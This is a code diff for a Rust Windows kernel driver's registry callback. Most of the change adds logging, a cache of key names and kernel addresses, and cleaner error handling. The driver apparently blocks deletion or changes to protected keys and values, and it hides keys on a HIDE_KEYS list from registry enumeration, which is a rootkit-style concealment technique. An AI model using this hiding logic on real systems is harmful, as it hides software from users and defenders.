@@ -6,7 +6,10 @@ use wdk::println;
 use wdk_sys::ntddk::*;
 use wdk_sys::_REG_NOTIFY_CLASS::*;
 use wdk_sys::{_MODE::KernelMode, *};
-
+use alloc::collections::BTreeMap;
+use crate::alloc::string::ToString;
+use core::sync::atomic::{AtomicU64, Ordering};
+use spin::Mutex;
 use crate::{
     registry::{
         utils::{check_key, enumerate_key},
@@ -22,7 +25,48 @@ use super::{
 
 /// Handle for Registry Callback.
 pub static mut CALLBACK_REGISTRY: LARGE_INTEGER = unsafe { core::mem::zeroed() };
+static KEY_LOG_CACHE: Mutex<BTreeMap<String, (u64, u64)>> = Mutex::new(BTreeMap::new());
+// A counter to trigger cache flush after a certain number of updates.
+static UPDATE_COUNT: AtomicU64 = AtomicU64::new(0);
+const FLUSH_THRESHOLD: u64 = 20; // flush cache every 20 updates
+fn update_key_log_cache(key: &str, reg_path: *const UNICODE_STRING) {
+    let addr = reg_path as u64;
+    let mut cache = KEY_LOG_CACHE.lock();
+    if let Some((min, max)) = cache.get_mut(key) {
+        if addr < *min {
+            *min = addr;
+        }
+        if addr > *max {
+            *max = addr;
+        }
+    } else {
+        cache.insert(key.to_string(), (addr, addr));
+    }
+}
 
+/// Flush the cache: log one consolidated message per key and clear the cache.
+fn flush_key_log_cache() {
+    let mut cache = KEY_LOG_CACHE.lock();
+    for (key, (min, max)) in cache.iter() {
+        log::info!(
+            "read_key: Retrieved key name '{}' from reg_path range: 0x{:X} - 0x{:X}",
+            key,
+            min,
+            max
+        );
+    }
+    cache.clear();
+}
+
+/// Update the cache and flush if the update count exceeds the threshold.
+fn update_and_maybe_flush(key: &str, reg_path: *const UNICODE_STRING) {
+    update_key_log_cache(key, reg_path);
+    let count = UPDATE_COUNT.fetch_add(1, Ordering::Relaxed) + 1;
+    if count >= FLUSH_THRESHOLD {
+        flush_key_log_cache();
+        UPDATE_COUNT.store(0, Ordering::Relaxed);
+    }
+}
 /// The registry callback function handles registry-related operations based on the notification class.
 ///
 /// # Arguments
@@ -34,78 +78,75 @@ pub static mut CALLBACK_REGISTRY: LARGE_INTEGER = unsafe { core::mem::zeroed() }
 /// # Returns
 ///
 /// * A status code indicating the result of the operation.
-pub unsafe extern "C" 
-fn registry_callback(
-    _callback_context: *mut c_void,
-    argument1: *mut c_void,
-    argument2: *mut c_void,
+pub unsafe extern "C" fn registry_callback(
+    _callback_context: *mut core::ffi::c_void,
+    argument1: *mut core::ffi::c_void,
+    argument2: *mut core::ffi::c_void,
 ) -> NTSTATUS {
-    let status;
 
+    
     let reg_notify_class = argument1 as i32;
-    match reg_notify_class {
+    let status = match reg_notify_class {
         RegNtPreSetValueKey => {
-            status = pre_set_value_key(argument2 as *mut REG_SET_VALUE_KEY_INFORMATION);
+            
+            pre_set_value_key(argument2 as *mut REG_SET_VALUE_KEY_INFORMATION)
         }
         RegNtPreDeleteValueKey => {
-            status = pre_delete_value_key(argument2 as *mut REG_DELETE_VALUE_KEY_INFORMATION);
+            
+            pre_delete_value_key(argument2 as *mut REG_DELETE_VALUE_KEY_INFORMATION)
         }
         RegNtPreDeleteKey => {
-            status = pre_delete_key(argument2 as *mut REG_DELETE_KEY_INFORMATION);
+            
+            pre_delete_key(argument2 as *mut REG_DELETE_KEY_INFORMATION)
         }
         RegNtPreQueryKey => {
-            status = pre_query_key(argument2 as *mut REG_QUERY_KEY_INFORMATION);
+           
+            pre_query_key(argument2 as *mut REG_QUERY_KEY_INFORMATION)
         }
         RegNtPostEnumerateKey => {
-            status = post_enumerate_key(argument2 as *mut REG_POST_OPERATION_INFORMATION);
+            
+            post_enumerate_key(argument2 as *mut REG_POST_OPERATION_INFORMATION)
         }
         RegNtPostEnumerateValueKey => {
-            status = post_enumerate_key_value(argument2 as *mut REG_POST_OPERATION_INFORMATION);
+            
+            post_enumerate_key_value(argument2 as *mut REG_POST_OPERATION_INFORMATION)
         }
-        _ => status = STATUS_SUCCESS,
-    }
+        _ => {
+            
+            STATUS_SUCCESS
+        }
+    };
 
     status
 }
 
 /// Handles the pre-delete key operation.
-///
-/// # Arguments
-///
-/// * `info` - A pointer to `REG_DELETE_KEY_INFORMATION`.
-///
-/// # Returns
-///
-/// * A status code indicating success or failure.
 unsafe fn pre_delete_key(info: *mut REG_DELETE_KEY_INFORMATION) -> NTSTATUS {
-    let status;
     if info.is_null() || (*info).Object.is_null() || !valid_kernel_memory((*info).Object as u64) {
         return STATUS_SUCCESS;
     }
 
     let key = match read_key(info) {
         Ok(key) => key,
-        Err(err) => return err,
+        Err(err) => {
+            log::error!("pre_delete_key: Failed to read key: error {}", err);
+            return err;
+        }
     };
 
-    status = if Registry::check_key(key, PROTECTION_KEYS.lock()) {
+    log::info!("pre_delete_key: Checking key '{}'", key);
+    let status = if Registry::check_key(key.clone(), PROTECTION_KEYS.lock()) {
+        log::warn!("pre_delete_key: Access denied for key '{}'", key);
         STATUS_ACCESS_DENIED
     } else {
         STATUS_SUCCESS
     };
 
+    log::info!("pre_delete_key: Returning status: {}", status);
     status
 }
 
 /// Performs the post-operation to enumerate registry key values.
-///
-/// # Arguments
-///
-/// * `info` - Pointer to the information structure of the post-execution logging operation.
-///
-/// # Returns
-///
-/// * Returns the status of the operation. If the key value is found and handled correctly, returns `STATUS_SUCCESS`.
 unsafe fn post_enumerate_key_value(info: *mut REG_POST_OPERATION_INFORMATION) -> NTSTATUS {
     if !NT_SUCCESS((*info).Status) {
         return (*info).Status;
@@ -185,15 +226,6 @@ unsafe fn post_enumerate_key_value(info: *mut REG_POST_OPERATION_INFORMATION) ->
     STATUS_SUCCESS
 }
 
-/// Performs the post-operation to enumerate registry keys.
-///
-/// # Arguments
-///
-/// * `info` - Pointer to the information structure of the post-execution logging operation.
-///
-/// # Returns
-///
-/// * Returns the status of the operation, keeping the original status if the previous operation failed.
 unsafe fn post_enumerate_key(info: *mut REG_POST_OPERATION_INFORMATION) -> NTSTATUS {
     if !NT_SUCCESS((*info).Status) {
         return (*info).Status;
@@ -248,7 +280,8 @@ unsafe fn post_enumerate_key(info: *mut REG_POST_OPERATION_INFORMATION) -> NTSTA
         (*pre_info).KeyInformationClass,
         &mut result_length,
     ) {
-        if !Registry::check_key(format!("{key}\\{key_name}"), HIDE_KEYS.lock()) {
+        let combined_key = format!("{}\\{}", key, key_name);
+        if !Registry::check_key(combined_key.clone(), HIDE_KEYS.lock()) {
             if let Some(pre_info_key_info) = (pre_info.KeyInformation as *mut c_void).as_mut() {
                 *(*pre_info).ResultLength = result_length;
                 core::ptr::copy_nonoverlapping(
@@ -262,6 +295,7 @@ unsafe fn post_enumerate_key(info: *mut REG_POST_OPERATION_INFORMATION) -> NTSTA
                 break;
             }
         } else {
+            log::info!("post_enumerate_key: Skipping hidden key '{}'", combined_key);
             counter += 1;
         }
     }
@@ -270,44 +304,32 @@ unsafe fn post_enumerate_key(info: *mut REG_POST_OPERATION_INFORMATION) -> NTSTA
     STATUS_SUCCESS
 }
 
+
+
+
 /// Handles the pre-query key operation.
-///
-/// # Arguments
-///
-/// * `info` - A pointer to `REG_QUERY_KEY_INFORMATION`.
-///
-/// # Returns
-///
-/// * A status code indicating success or failure.
 unsafe fn pre_query_key(info: *mut REG_QUERY_KEY_INFORMATION) -> NTSTATUS {
-    let status;
     if info.is_null() || (*info).Object.is_null() || !valid_kernel_memory((*info).Object as u64) {
+        
         return STATUS_SUCCESS;
     }
 
     let key = match read_key(info) {
         Ok(key) => key,
-        Err(err) => return err,
+        Err(err) => {
+            log::error!("pre_query_key: Failed to read key: error {}", err);
+            return err;
+        }
     };
+    log::info!("pre_query_key: Read key '{}'", key);
 
-    status = if Registry::check_key(key.clone(), HIDE_KEYS.lock()) {
-        STATUS_SUCCESS
-    } else {
-        STATUS_SUCCESS
-    };
-
+    // Here you might perform additional checks if needed.
+    let status = STATUS_SUCCESS;
+    log::info!("pre_query_key: Returning status: {}", status);
     status
 }
 
 /// Handles the pre-delete value key operation.
-///
-/// # Arguments
-///
-/// * `info` - A pointer to `REG_DELETE_VALUE_KEY_INFORMATION`.
-///
-/// # Returns
-///
-/// * A status code indicating success or failure.
 unsafe fn pre_delete_value_key(info: *mut REG_DELETE_VALUE_KEY_INFORMATION) -> NTSTATUS {
     if info.is_null() || (*info).Object.is_null() || !valid_kernel_memory((*info).Object as u64) {
         return STATUS_SUCCESS;
@@ -315,26 +337,35 @@ unsafe fn pre_delete_value_key(info: *mut REG_DELETE_VALUE_KEY_INFORMATION) -> N
 
     let key = match read_key(info) {
         Ok(key) => key,
-        Err(err) => return err,
+        Err(err) => {
+            log::error!("pre_delete_value_key: Failed to read key: error {}", err);
+            return err;
+        }
     };
 
     let value_name = (*info).ValueName;
-    if (*info).ValueName.is_null()
+    if value_name.is_null()
         || (*value_name).Buffer.is_null()
         || (*value_name).Length == 0
         || !valid_kernel_memory((*value_name).Buffer as u64)
     {
+        log::info!("pre_delete_value_key: Invalid value name pointer or length.");
         return STATUS_SUCCESS;
     }
 
-    let buffer =
-        core::slice::from_raw_parts((*value_name).Buffer, ((*value_name).Length / 2) as usize);
+    let buffer = core::slice::from_raw_parts(
+        (*value_name).Buffer,
+        ((*value_name).Length / 2) as usize,
+    );
     let name = String::from_utf16_lossy(buffer);
-    if Registry::<(String, String)>::check_target(
-        key.clone(),
-        name.clone(),
-        PROTECTION_KEY_VALUES.lock(),
-    ) {
+    
+
+    if Registry::<(String, String)>::check_target(key.clone(), name.clone(), PROTECTION_KEY_VALUES.lock()) {
+        log::warn!(
+            "pre_delete_value_key: Access denied for key '{}' value '{}'",
+            key,
+            name
+        );
         STATUS_ACCESS_DENIED
     } else {
         STATUS_SUCCESS
@@ -342,14 +373,6 @@ unsafe fn pre_delete_value_key(info: *mut REG_DELETE_VALUE_KEY_INFORMATION) -> N
 }
 
 /// Handles the pre-set value key operation.
-///
-/// # Arguments
-///
-/// * `info` - A pointer to `REG_SET_VALUE_KEY_INFORMATION`.
-///
-/// # Returns
-///
-/// * A status code indicating success or failure.
 unsafe fn pre_set_value_key(info: *mut REG_SET_VALUE_KEY_INFORMATION) -> NTSTATUS {
     if info.is_null() || (*info).Object.is_null() || !valid_kernel_memory((*info).Object as u64) {
         return STATUS_SUCCESS;
@@ -357,22 +380,35 @@ unsafe fn pre_set_value_key(info: *mut REG_SET_VALUE_KEY_INFORMATION) -> NTSTATU
 
     let key = match read_key(info) {
         Ok(key) => key,
-        Err(err) => return err,
+        Err(err) => {
+            log::error!("pre_set_value_key: Failed to read key: error {}", err);
+            return err;
+        }
     };
 
     let value_name = (*info).ValueName;
-    if (*info).ValueName.is_null()
+    if value_name.is_null()
         || (*value_name).Buffer.is_null()
         || (*value_name).Length == 0
         || !valid_kernel_memory((*value_name).Buffer as u64)
     {
+        log::info!("pre_set_value_key: Invalid value name pointer or length.");
         return STATUS_SUCCESS;
     }
 
-    let buffer =
-        core::slice::from_raw_parts((*value_name).Buffer, ((*value_name).Length / 2) as usize);
+    let buffer = core::slice::from_raw_parts(
+        (*value_name).Buffer,
+        ((*value_name).Length / 2) as usize,
+    );
     let name = String::from_utf16_lossy(buffer);
+    
+
     if Registry::check_target(key.clone(), name.clone(), PROTECTION_KEY_VALUES.lock()) {
+        log::warn!(
+            "pre_set_value_key: Access denied for key '{}' value '{}'",
+            key,
+            name
+        );
         STATUS_ACCESS_DENIED
     } else {
         STATUS_SUCCESS
@@ -380,42 +416,53 @@ unsafe fn pre_set_value_key(info: *mut REG_SET_VALUE_KEY_INFORMATION) -> NTSTATU
 }
 
 /// Reads the key name from the registry information.
-///
-/// # Arguments
-///
-/// * `info` - A pointer to the registry information.
-///
-/// # Returns
-///
-/// * `Ok(String)` - The key name.
-/// * `Err(NTSTATUS)` - error status.
-unsafe fn read_key<T: RegistryInfo>(info: *mut T) -> Result<String, NTSTATUS> {
+pub unsafe fn read_key<T: RegistryInfo>(info: *mut T) -> Result<String, NTSTATUS> {
+    let object_ptr = (*info).get_object();
+    
     let mut reg_path = core::ptr::null::<UNICODE_STRING>();
     let status = CmCallbackGetKeyObjectIDEx(
         core::ptr::addr_of_mut!(CALLBACK_REGISTRY),
-        (*info).get_object(),
-        null_mut(),
+        object_ptr,
+        core::ptr::null_mut(),
         &mut reg_path,
         0,
     );
-
+    
     if !NT_SUCCESS(status) {
-        return Err(STATUS_SUCCESS);
+        log::error!(
+            "read_key: CmCallbackGetKeyObjectIDEx failed with status: {} for object pointer: {:?}",
+            status,
+            object_ptr
+        );
+        return Err(status);
     }
-
-    if reg_path.is_null()
-        || (*reg_path).Buffer.is_null()
-        || (*reg_path).Length == 0
-        || !valid_kernel_memory((*reg_path).Buffer as u64)
-    {
+    
+    if reg_path.is_null() {
+        log::error!("read_key: reg_path is null for object pointer: {:?}", object_ptr);
+        return Err(STATUS_UNSUCCESSFUL);
+    }
+    
+    let buffer = (*reg_path).Buffer;
+    let length = (*reg_path).Length;
+    
+    if buffer.is_null() || length == 0 {
+        log::error!(
+            "read_key: Invalid reg_path returned. reg_path: {:?}, Buffer: {:?}, Length: {}",
+            reg_path, buffer, length
+        );
         CmCallbackReleaseKeyObjectIDEx(reg_path);
-        return Err(STATUS_SUCCESS);
+        return Err(STATUS_UNSUCCESSFUL);
     }
-
-    let buffer = core::slice::from_raw_parts((*reg_path).Buffer, ((*reg_path).Length / 2) as usize);
-    let name = String::from_utf16_lossy(buffer);
-
+    
+    // Note: the Length field is in bytes; we divide by 2 for wide characters.
+    let key_slice = core::slice::from_raw_parts(buffer, (length / 2) as usize);
+    let key_name = String::from_utf16_lossy(key_slice);
+    
+    // Instead of logging each duplicate message, update the cache.
+    update_and_maybe_flush(&key_name, reg_path);
+    
     CmCallbackReleaseKeyObjectIDEx(reg_path);
-
-    Ok(name)
+    Ok(key_name)
 }
+
+
